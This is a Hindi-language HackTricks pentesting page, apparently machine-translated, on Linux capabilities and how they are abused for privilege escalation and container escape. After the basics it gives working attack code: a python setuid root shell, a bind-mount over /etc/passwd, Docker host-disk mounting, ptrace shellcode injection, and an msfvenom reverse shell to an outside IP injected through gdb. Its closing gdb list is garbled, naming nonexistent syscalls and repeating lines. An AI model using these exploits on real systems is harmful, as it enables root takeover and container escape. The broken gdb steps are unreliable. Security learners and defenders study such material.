# लिनक्स क्षमताएं

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** अनुसरण करें।**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके अपने हैकिंग ट्रिक्स साझा करें।**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) स्पेन में सबसे महत्वपूर्ण साइबर सुरक्षा इवेंट है और यूरोप में सबसे महत्वपूर्ण माना जाता है। तकनीकी ज्ञान को बढ़ावा देने की मिशन के साथ, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए एक उबलता हुआ मिलन स्थल है।

{% embed url="https://www.rootedcon.com/" %}

## क्षमताओं के लिए क्यों?

लिनक्स क्षमताएं एक प्रक्रिया को उपलब्ध रूट विशेषाधिकारों का एक उपसेट प्रदान करती हैं। इससे रूट विशेषाधिकारों को छोटे और अलग-अलग इकाइयों में विभाजित किया जाता है। प्रत्येक इकाई को फिर से प्रक्रियाओं को स्वतंत्र रूप से प्रदान किया जा सकता है। इस तरह पूरी क्षमता सेट को कम किया जाता है और उत्पीड़न के जोखिम को कम किया जाता है।

लिनक्स क्षमताओं की काम करने की बेहतर समझ के लिए, हम पहले उस समस्या पर नज़र डालें जिसे यह हल करने की कोशिश करती है।

चलो मान लेते हैं हम एक प्रक्रिया को एक साधारण उपयोगकर्ता के रूप में चला रहे हैं। इसका मतलब है कि हम गैर-विशेषाधिकृत हैं। हम केवल उन डेटा तक पहुंच सकते हैं जो हमारे पास, हमारे समूह के पास है, या जिसे सभी उपयोगकर्ताओं के लिए पहुंच के लिए चिह्नित किया गया है। किसी समय बाद, हमारी प्रक्रिया को अपने कर्तव्यों को पूरा करने के लिए थोड़ी अधिक अनुमतियाँ की आवश्यकता होती है, जैसे नेटवर्क सॉकेट खोलना। समस्या यह है कि साधारण उपयोगकर्ता सॉकेट नहीं खोल सकते, क्योंकि इसके लिए रूट अनुमतियाँ की आवश्यकता होती है।

## क्षमता सेट

**विरासत क्षमताएं**

**CapEff**: _प्रभावी_ क्षमता सेट वास्तविक रूप से उन सभी क्षमताओं को प्रतिष्ठान करती है जिन्हें प्रक्रिया वर्तमान में उपयोग कर रही है (यह क्षमता सेट वास्तव में एकल बिट है जो इसका इशारा करता है कि क्षमता सेट की अनुमतियों को बाइनरी चलाने पर प्रभावी सेट में ले जाएगी)। फ़ाइल क्षमताओं के लिए प्रभ
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
यह कमांड अधिकांश सिस्टमों पर 5 पंक्तियों को लौटाना चाहिए।

* CapInh = विरासत में मिली क्षमताएं
* CapPrm = अनुमत क्षमताएं
* CapEff = प्रभावी क्षमताएं
* CapBnd = सीमित सेट
* CapAmb = पर्यावरणीय क्षमताएं सेट
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
ये हेक्साडेसिमल नंबर्स समझ में नहीं आते। हम capsh यूटिलिटी का उपयोग करके इन्हें कैपेबिलिटीज़ नाम में डिकोड कर सकते हैं।
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
चलो अब देखते हैं कि `ping` द्वारा उपयोग की जाने वाली **क्षमताएं** क्या हैं:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
यद्यपि वह काम करता है, लेकिन एक और आसान तरीका है। एक चल रहे प्रक्रिया की क्षमताओं को देखने के लिए, सीधे **getpcaps** उपकरण का उपयोग करें और इसके प्रक्रिया आईडी (PID) के बाद जाएं। आप एक प्रक्रिया आईडी की सूची भी प्रदान कर सकते हैं।
```bash
getpcaps 1234
```
यहां जांचें कि `tcpdump` की क्षमताओं का क्या हाल है जब बाइनरी को पर्याप्त क्षमताएं ( `cap_net_admin` और `cap_net_raw`) दी गई हैं ताकि नेटवर्क को स्निफ किया जा सके (_tcpdump प्रक्रिया 9562 में चल रहा है_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
जैसा कि आप देख सकते हैं, दिए गए capabilities एक बाइनरी के capabilities के साथ मेल खाते हैं।
_getpcaps_ टूल **capget()** सिस्टम कॉल का उपयोग करता है ताकि एक विशेष thread के लिए उपलब्ध capabilities को प्रश्न कर सके। इस सिस्टम कॉल को अधिक जानकारी प्राप्त करने के लिए केवल PID प्रदान करने की आवश्यकता होती है।

### बाइनरी क्षमताएं

बाइनरी को क्षमताएं हो सकती हैं जो कार्यान्वयन के दौरान उपयोग की जा सकती हैं। उदाहरण के लिए, `ping` बाइनरी में `cap_net_raw` क्षमता के साथ मिलना बहुत सामान्य है:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
आप निम्नलिखित का उपयोग करके **क्षमताओं के साथ बाइनरी खोज सकते हैं**:
```bash
getcap -r / 2>/dev/null
```
### capsh के साथ capabilities को छोड़ना

यदि हम _ping_ के लिए CAP\_NET\_RAW capabilities को छोड़ दें, तो ping उपयोगीता काम नहीं करेगी।
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
इसके अलावा, _capsh_ की आउटपुट के साथ, _tcpdump_ कमांड भी एक त्रुटि उठानी चाहिए।

> /bin/bash: /usr/sbin/tcpdump: ऑपरेशन अनुमति नहीं है

यह त्रुटि स्पष्ट रूप से दिखाती है कि पिंग कमांड को एक ICMP सॉकेट खोलने की अनुमति नहीं है। अब हम निश्चित रूप से जानते हैं कि यह उम्मीद के अनुसार काम करता है।

### क्षमताओं को हटाएं

आप किसी बाइनरी की क्षमताओं को हटा सकते हैं।
```bash
setcap -r </path/to/binary>
```
## उपयोगकर्ता क्षमताएं

शायद **उपयोगकर्ताओं को भी क्षमताएं असाइन करना संभव है**। यह शायद इसका अर्थ है कि उपयोगकर्ता द्वारा निष्पादित हर प्रक्रिया क्षमताओं का उपयोग कर सकेगी।\
[इस](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [इस](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) और [इस](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) के आधार पर कुछ फ़ाइलें कॉन्फ़िगर करनी होगी ताकि एक उपयोगकर्ता को निश्चित क्षमताएं दी जा सकें, लेकिन क्षमताएं प्रत्येक उपयोगकर्ता को असाइन करने वाला फ़ाइल `/etc/security/capability.conf` होगी।\
फ़ाइल उदाहरण:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## पर्यावरण क्षमताएं

निम्नलिखित कार्यक्रम को कंपाइल करके **क्षमताएं प्रदान करने वाले एक वातावरण में एक बैश शैल उत्पन्न करना संभव है**।

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**बाश** में **कंपाइल्ड वातावरण बाइनरी द्वारा निष्पादित** के अंदर, **नई क्षमताएं** देखने की संभावना होती है (एक साधारण उपयोगकर्ता को "वर्तमान" खंड में कोई क्षमता नहीं होगी)।
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
आप **केवल उन capabilities को जोड़ सकते हैं जो permitted और inheritable सेट में मौजूद हैं**।
{% endhint %}

### क्षमता-जागरूक/क्षमता-मूर्ख बाइनरी

**क्षमता-जागरूक बाइनरी** नई क्षमताओं का उपयोग नहीं करेंगी जो पर्यावरण द्वारा दी गई हैं, हालांकि **क्षमता-मूर्ख बाइनरी उन्हें उपयोग करेंगी** क्योंकि वे उन्हें अस्वीकार नहीं करेंगी। यह क्षमता-मूर्ख बाइनरी को विशेष वातावरण में अवरोधित बनाता है जो बाइनरी को क्षमताएं प्रदान करता है।

## सेवा क्षमताएं

डिफ़ॉल्ट रूप से **रूट के रूप में चल रही सेवा को सभी क्षमताएं सौंपी जाएगी**, और कई अवसरों में यह खतरनाक हो सकता है।\
इसलिए, एक **सेवा कॉन्फ़िगरेशन** फ़ाइल क्षमताएं निर्दिष्ट करने की अनुमति देती है, जिन्हें आप इसे होना चाहिए, **और** उपयोगकर्ता जो सेवा को निष्पादित करना चाहिए, अनावश्यक विशेषाधिकारों के साथ सेवा न चलाने के लिए।
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## डॉकर कंटेनर में क्षमताएं

डॉकर द्वारा डिफ़ॉल्ट रूप से कंटेनर्स को कुछ क्षमताएं सौंपी जाती हैं। इन क्षमताओं को जांचना बहुत आसान है, इसके लिए निम्नलिखित कमांड चलाएं:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) स्पेन में सबसे महत्वपूर्ण साइबर सुरक्षा कार्यक्रम है और यूरोप में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने की मिशन के साथ**, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए एक उबलता हुआ मिलन स्थल है।

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

यदि आप **विशेषाधिकारित ऑपरेशन करने के बाद अपने खुद के प्रक्रियाओं को सीमित करना चाहते हैं** (उदाहरण के लिए, chroot सेट करने और सॉकेट से बाइंड करने के बाद), तो क्षमताएं उपयोगी हो सकती हैं। हालांकि, इन्हें दुरुपयोग किया जा सकता है जब आप उन्हें दुष्ट आदेश या तर्क पास करके चलाते हैं जो फिर रूट के रूप में चलाए जाते हैं।

आप `setcap` का उपयोग करके कार्यक्रमों पर क्षमताएं थोप सकते हैं, और `getcap` का उपयोग करके इनकी क्वेरी कर सकते हैं:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` का मतलब है कि आप क्षमता को जोड़ रहे हैं ("-" इसे हटा देगा) जैसे कि Effective और Permitted.

एक सिस्टम या फ़ोल्डर में क्षमताओं के साथ कार्यक्रमों की पहचान करने के लिए:
```bash
getcap -r / 2>/dev/null
```
### उदाहरण का शोध

निम्नलिखित उदाहरण में `/usr/bin/python2.6` बाइनरी प्रिवेस्क के लिए संकटग्रस्त पाया जाता है:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**टीसीपीडंप** को **किसी भी उपयोगकर्ता को पैकेट स्निफ करने की अनुमति देने** के लिए आवश्यक **क्षमताएं**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "खाली" क्षमताओं का विशेष मामला

ध्यान दें कि किसी प्रोग्राम फ़ाइल को खाली क्षमता सेट दी जा सकती है, और इस प्रकार एक सेट-यूज़र-आईडी-रूट प्रोग्राम बनाया जा सकता है जो प्रोसेस के इफ़ेक्टिव और सेव्ड सेट-यूज़र-आईडी को 0 में बदलता है, लेकिन उस प्रोसेस को कोई क्षमताएँ नहीं देता है। या सीधे शब्दों में कहें तो, अगर आपके पास एक बाइनरी है जो:

1. रूट द्वारा स्वामित्विक नहीं है
2. `SUID`/`SGID` बिट सेट नहीं हैं
3. खाली क्षमताएँ सेट हैं (उदा.: `getcap myelf` `myelf =ep` लौटाता है)

तो **वह बाइनरी रूट के रूप में चलेगी**।

## CAP\_SYS\_ADMIN

[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) बड़े हिस्से में एक सभी क्षमताओं के लिए एक आवश्यक क्षमता है, यह आसानी से अतिरिक्त क्षमताओं या पूर्ण रूट (आमतौर पर सभी क्षमताओं का पहुंच) की ओर ले जा सकती है। `CAP_SYS_ADMIN` को कई प्रशासनिक ऑपरेशन करने के लिए आवश्यक होता है, जो कंटेनर्स से छोड़ना कठिन होता है अगर वे कंटेनर के भीतर विशेषाधिकारित ऑपरेशन करते हैं। इस क्षमता को आमतौर पर पूरे सिस्टम की तुलना में व्यक्तिगत अनुप्रयोग कंटेनरों के लिए आवश्यक रखना आम होता है। इसके अलावा, इसकी मदद से **डिवाइस माउंट** करने या कंटेनर से बाहर निकलने के लिए **रिलीज़_एजेंट** का दुरुपयोग करने की अनुमति होती है।

**बाइनरी के साथ उदाहरण**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python का उपयोग करके आप वास्तविक _passwd_ फ़ाइल के ऊपर एक संशोधित _passwd_ फ़ाइल माउंट कर सकते हैं:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
और अंत में `/etc/passwd` पर संशोधित `passwd` फ़ाइल को **माउंट** करें:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
और आप **`su` के रूप में रूट** के रूप में पासवर्ड "पासवर्ड" का उपयोग करके कर सकेंगे।

**पर्यावरण के साथ उदाहरण (Docker breakout)**

आप निम्नलिखित का उपयोग करके डॉकर कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले आउटपुट में आप देख सकते हैं कि SYS_ADMIN क्षमता सक्षम है।

* **माउंट**

इससे डॉकर कंटेनर को **होस्ट डिस्क को माउंट करने और इसे स्वतंत्र रूप से एक्सेस करने** की अनुमति होती है:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **पूर्ण पहुंच**

पिछली विधि में हमने डॉकर होस्ट डिस्क तक पहुंचा।
यदि आपको लगता है कि होस्ट पर एक **SSH** सर्वर चल रहा है, तो आप **डॉकर होस्ट** डिस्क में एक उपयोगकर्ता बना सकते हैं और इसे SSH के माध्यम से एक्सेस कर सकते हैं:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**इसका मतलब है कि आप होस्ट के अंदर चल रहे किसी प्रक्रिया में शेलकोड संयोजित करके कंटेनर से बाहर निकल सकते हैं।** होस्ट के अंदर चल रही प्रक्रियाओं तक पहुंचने के लिए कंटेनर को कम से कम **`--pid=host`** के साथ चलाना चाहिए।

[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `ptrace(2)` और हाल ही में प्रस्तुत की गई क्रॉस मेमोरी अटैच सिस्टम कॉल्स जैसे `process_vm_readv(2)` और `process_vm_writev(2)` का उपयोग करने की अनुमति देता है। यदि इस क्षमता की प्रदान की जाती है और `ptrace(2)` सिस्टम कॉल स्वयं एक सेकंप फ़िल्टर द्वारा अवरुद्ध नहीं किया जाता है, तो यह एक हमलावर्ती को अन्य सेकंप प्रतिबंधों को दौर करने की अनुमति देगा, [seccomp को अनुमति देने पर bypass करने के लिए PoC](https://gist.github.com/thejh/8346f47e359adecd1d53) देखें या **निम्नलिखित PoC** देखें:

**उदाहरण बाइनरी के साथ (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**बाइनरी के साथ उदाहरण (gdb)**

`ptrace` क्षमता के साथ `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
जीडीबी के माध्यम से मेमोरी में इंजेक्ट करने के लिए एमएसएफवेनम के साथ एक शेलकोड बनाएं।

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<आपका IP> LPORT=<आपका पोर्ट> -f c -b "\x00" -e x86/shikata_ga_nai
```

यहां `<आपका IP>` को अपने आईपी संख्या से और `<आपका पोर्ट>` को इंजेक्शन करने के लिए उपयोग किए जाने वाले पोर्ट संख्या से बदलें।
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
जीडीबी के साथ रूट प्रोसेस को डीबग करें और पहले उत्पन्न जीडीबी लाइनों को कॉपी-पेस्ट करें:

```bash
gdb -p <pid>
```

जीडीबी प्रोम्प्ट में निम्नलिखित लाइनों को कॉपी-पेस्ट करें:

```bash
set follow-fork-mode child
set detach-on-fork off
```

अब, रूट प्रोसेस को डीबग करने के लिए निम्नलिखित जीडीबी लाइनों को कॉपी-पेस्ट करें:

```bash
catch syscall ptrace
catch syscall fork
catch syscall clone
catch syscall vfork
catch syscall execve
catch syscall execveat
catch syscall setuid
catch syscall setgid
catch syscall setreuid
catch syscall setregid
catch syscall setresuid
catch syscall setresgid
catch syscall setfsuid
catch syscall setfsgid
catch syscall capset
catch syscall capsetp
catch syscall capsetxattr
catch syscall capget
catch syscall capgetp
catch syscall capgetxattr
catch syscall capsetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
